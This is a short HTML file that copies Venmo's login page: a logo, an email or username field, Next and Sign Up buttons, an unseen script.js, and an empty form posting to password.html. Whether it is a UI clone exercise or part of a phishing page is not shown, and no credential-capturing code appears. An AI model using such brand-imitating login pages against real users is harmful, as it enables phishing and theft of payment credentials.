<!DOCTYPE html>
<html>
<head>
  <title>Venmo Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <img src="venmo-logo.png" alt="Venmo Logo">
    <h1>Log In</h1>
    <form>
      <input type="text" id="email" name="email" placeholder="Enter email, mobile, or username" required>
      <button type="submit" class="blue-button">Next</button>
      <button type="button" class="white-button">Sign Up</button>
    </form>
    <script src="script.js"></script>
    <form action="password.html" method="post"></form>
  </div>
</body>
</html>
